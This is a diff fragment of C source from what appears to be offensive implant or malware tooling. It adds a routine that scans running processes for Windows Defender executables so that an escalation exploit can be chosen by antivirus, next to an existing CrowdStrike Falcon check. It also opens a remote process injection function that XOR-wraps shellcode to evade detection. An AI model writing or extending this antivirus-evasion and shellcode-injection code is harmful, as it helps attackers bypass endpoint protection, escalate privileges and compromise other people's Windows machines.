@@ -755,6 +755,30 @@ static BOOL lt_falcon_present(void) {
     return found;
 }
 
+/*
+ * Detect Windows Defender / MsMpEng presence.
+ * Used to surface ShieldBreak (Server 2025 / Win11 25H2) or RoguePlanet (Win10/11)
+ * as the escalation path when WD is the active AV.
+ */
+static BOOL lt_wd_present(void) {
+    PVOID buf=lt_qsys(); if(!buf) return FALSE;
+    static const WCHAR *_wd[]={
+        L"MsMpEng.exe",L"NisSrv.exe",L"MpCmdRun.exe",
+        L"SecurityHealthService.exe",L"MsMpEngCP.exe",NULL
+    };
+    BOOL found=FALSE;
+    LT_SPROC *p=(LT_SPROC*)buf;
+    for(;;){
+        if(p->ImageName.Buffer&&!found)
+            for(int _wi=0;_wd[_wi]&&!found;_wi++)
+                if(lt_wicmp(p->ImageName.Buffer,_wd[_wi])==0) found=TRUE;
+        if(!p->NextEntryOffset) break;
+        p=(LT_SPROC*)((PBYTE)p+p->NextEntryOffset);
+    }
+    HeapFree(GetProcessHeap(),0,buf);
+    return found;
+}
+
 /* ─── Remote process injection (encrypted wrapper → RX execute, no RWX) ─── */
 static BOOL POLY_INJECT(DWORD pid, PBYTE sc, SIZE_T sclen) {
     /* Wrap shellcode in XOR-decrypt stub so remote bytes are never cleartext */
